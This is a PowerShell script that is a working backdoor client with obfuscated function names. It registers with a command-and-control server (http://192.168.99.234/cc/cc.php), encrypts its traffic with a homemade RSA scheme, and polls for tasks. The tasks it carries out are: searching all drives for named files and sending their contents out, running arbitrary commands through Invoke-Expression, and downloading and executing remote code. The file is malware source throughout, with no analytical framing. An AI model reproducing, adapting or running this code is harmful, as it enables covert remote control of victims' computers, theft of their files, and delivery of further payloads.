$GET_FILE = 'get-fle' 
$DOWN_EXEC = 'dow-exe'
$RUN_CMD = 'run-cmd'

$GET_REG = 'get-reg'
$GET_TASK = 'get-tak'
$GET_UPDATE = 'get-upd'
$GET_REP = 'get-rep'

$STATUS_INIT  = 0x0000
$STATUS_REGED = 0x8000
$STATUS_TASK  = $STATUS_REGED -bor 0x1
$STATUS_PADD  = $STATUS_REGED -bor 0x2


$url = 'http://192.168.99.234/cc/cc.php'
$status = $STATUS_INIT
$task = $null
$running = $True

$pubk = (1501,377753)

function get-Md5Hash($str)
{
	$md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
	$utf8 = new-object -TypeName System.Text.UTF8Encoding
	$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($str)))
	return $hash -replace '-'
}

function get-ComputeName
{
	try
	{
		return (Get-WmiObject Win32_ComputerSystem).Name;
	} catch 
	{
		return "ErrComputeName";
	}
}

function get-clientID
{
	try
	{
		$did = (wmic diskdrive get SerialNumber)
		$cid = get-Md5Hash $did
		return $cid
	}
	catch
	{
		$CompName = get-ComputeName
		return get-Md5Hash $CompName
	}
}
function Reg-Info
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REG
	return @{c = $c ; x = $clientID ;e = $time ; i = 0} |  ConvertTo-Json
}
function get-Task
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_TASK
	return @{c = $c ; x = $clientID ;e = $time  ; i = 0} |  ConvertTo-Json
}
function EttRRRRRRhd ( $tid , $taskinfo )
{
	$clientID = get-clientID
	$time = Get-Date
	$c = $GET_REP
	return @{c = $c ; x = $clientID ;e = $taskinfo; i = $tid} |  ConvertTo-Json
}

function YTRKLJHBKJHJHGV($msg)
{
	while($True)
	{
		try
		{
			$content = $msg
			$webRq = [System.Net.WebRequest]::Create($url)
			$webRq.proxy = [Net.WebRequest]::GetSystemWebProxy()
			$webRq.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
			
            
            #
            
            $content = YNHGFOI8YIUGH $content
            
            
            #
            $content = OPKE3989hYYY $pubk $content
            #
            
            #
            $content = YNHGFOI8YIUGH $content
            
			$enc = [System.Text.Encoding]::UTF8.GetBytes($content)
            
            #

			$webRq.Method = 'POST'
			$webRq.ContentLength = $enc.length
			
			
			if ($enc.length -gt 0)
			{
				$req_stream = $webRq.GetRequestStream()
				$req_stream.Write($enc , 0 , $enc.length)
				
			}
			
			[System.Net.WebResponse] $rep = $webRq.GetResponse()
			if ($rep -ne $null)
			{
				$data = $rep.GetResponseStream()
				[System.IO.StreamReader] $res_d = New-Object System.IO.StreamReader $data
				[String] $result = $res_d.ReadToEnd()
 			}
		}
		catch
		{
			$result = 'err'
            #
		}
		
		if ($result -eq 'err')
		{
			
		}
		else
		{
            
			return $result
		}
	}
}

function POIUIGKJNBYFF($msg)
{

    $msg = OKMNHGGGGSSAAA $pubk $msg
	$msg = ConvertFrom-Json -InputObject $msg
	return $msg.r,$msg.e
}

function YNHGFOI8YIUGH( $str )
{
	return [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes($str))
}

function VCDHJIIDDSQQQ( $b64 )
{
	return [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($b64))
}

function POPOUIUJKKKI($file)
{
	return YNHGFOI8YIUGH (Get-Content $file)
}

function MJOOLLFGFASA($name)
{
	$filelist = @()
	$result = @{}
	
	for ($i = 0x43 ; $i -lt 0x5b; ++ $i)
	{
		try
		{   $dc = '{0}:/' -f ([char]$i)
			$file = Get-ChildItem "$dc" -recurse $name | %{$_.FullName}
			if ($file.length -gt 0)
			{
				$filelist += $file
			}
		}
		catch
		{
			continue
		}
	}
	
	$result.ct = $filelist.length
	$result.dt = @()
	foreach( $f in $filelist)
	{
		$fd = POPOUIUJKKKI $f
		$result.dt += @{path=(YNHGFOI8YIUGH $f ); txt=$fd}
	}
	return ConvertTo-Json -InputObject $result 
}


function DXCFGIOUUGKJB764($x, $h, $n)
{
   $y = 1
   while( $h -gt 0 )
   {
        if ( ( $h % 2 ) -eq 0)
        {
            $x = ($x * $x) % $n
            $h = $h / 2
        }else
        {
            $y = ($x * $y) % $n
            $h = $h - 1
        }
   }
   return $y
}

function OPKE3989hYYY($pk , $plaintext)
{
    $key , $n = $pk
    $arr = @()
    for ($i = 0 ; $i -lt $plaintext.length ; $i++)
    {
     $x = DXCFGIOUUGKJB764 ([int] $plaintext[$i]) $key $n
     $arr += $x
    }
    return $arr
}
function OKMNHGGGGSSAAA($pk,$enctext)
{
    $key , $n = $pk
    $txt = ""

    $enctext = VCDHJIIDDSQQQ $enctext
    [int[]]$enctab =  $enctext -split ' '
    foreach ($x in $enctab)
    {
        if ($x -eq 0)
        {
            continue
        }
        $x = DXCFGIOUUGKJB764 $x $key $n
        $txt += [char][int]$x
    }
    $txt = VCDHJIIDDSQQQ($txt)
    return $txt
}

function UIHIUHGUYGOIJOIHGIHGIH($cmd)
{
	$cmd = ConvertFrom-Json -InputObject $cmd
	$c = $cmd.c
	$i = $cmd.i
	$e = $cmd.e
	$x = $cmd.x 
	
	#
	#
	
	if ($c -eq $GET_FILE)
	{
		
		$d = MJOOLLFGFASA $e
	}
	elseif ($c -eq $RUN_CMD)
	{
		
		$d = Invoke-Expression $e -ErrorAction SilentlyContinue
	}
	elseif ($c -eq $DOWN_EXEC)
	{
		
		$d = Invoke-Expression ((New-Object Net.WebClient).DownloadString("$e")) -ErrorAction SilentlyContinue
	}
return @($i , $d)
}


$MuName = 'Global\_94_HACK_U_HAHAHAHAHA'
$retFlag = $flase
$Result = $True 
$MyMutexObj = New-Object System.Threading.Mutex ($true,$MuName,[ref]$retFlag)
if ($retFlag)
{
	$Result = $True
}
else
{
	$Result = $False
}

if ($Result)
{
	while($True -and $running)
	{
		
		if($status -eq $STATUS_INIT)
		{
			
			$OO0O0O0O00 = Reg-Info
			
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
            
			$r,$e = POIUIGKJNBYFF($ret)
            
            
			if ($r -eq 'yes' -and $e -eq 'ok_then_u_go')
			{
				$status = $STATUS_PADD
				
				
			}
		}
		if ($status -eq $STATUS_PADD)
		{
			
			
			$OO0O0O0O00 = get-Task
			
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				
				$task = $e
				$status = $STATUS_TASK
			}
			
		}
		if ($status -eq $STATUS_TASK)
		{
			
			
			#
			$ret = UIHIUHGUYGOIJOIHGIHGIH($task)
			$OO0O0O0O00 = EttRRRRRRhd $ret[0] $ret[1]
			$ret = YTRKLJHBKJHJHGV($OO0O0O0O00)
			
			$r,$e = POIUIGKJNBYFF($ret)
			if ($r -eq 'yes')
			{
				$status = $STATUS_PADD
				$task = $null
			}
		}
		
		sleep 3
	}
	$MyMutexObj.ReleaseMutex() | Out-Null
	$MyMutexObj.Dispose() | Out-Null
}
else
{

}
